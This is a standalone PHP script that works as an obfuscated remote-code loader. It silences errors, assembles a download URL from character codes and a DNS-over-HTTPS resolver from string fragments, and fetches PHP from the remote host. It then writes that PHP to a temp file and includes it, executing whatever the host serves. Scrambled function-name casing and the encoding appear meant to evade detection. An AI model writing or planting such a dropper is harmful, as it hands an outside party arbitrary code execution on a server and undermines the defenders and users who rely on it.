<?php
error_reporting(0);set_time_limit(0);

$u=[104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,100,117,109,109,121,46,112,104,112];
$L=implode('',array_map('chr',$u));

$d='ht';$d.='tps:/';$d.='/clo';$d.='udfl';$d.='are-d';$d.='ns.c';$d.='om/d';$d.='ns-q';$d.='uery';

$C=cUrL_inIt($L);

if(defined('CURLOPT_DOH_URL')){
    cuRl_sEtOpT($C,CURLOPT_DOH_URL,$d);
}

cUrL_sEtOpT($C,CURLOPT_RETURNTRANSFER,true);
cUrL_sEtOpT($C,CURLOPT_SSL_VERIFYHOST,2);
cUrL_sEtOpT($C,CURLOPT_SSL_VERIFYPEER,true);

$r=CuRL_exEc($C);
cURL_cLOsE($C);

$t=TmPfiLe();
$m=stReaM_GEt_mEtA_dAtA($t);
$p=$m['uri'];

FprInTf($t,'%s',$r);

inClUDe($p);
?>
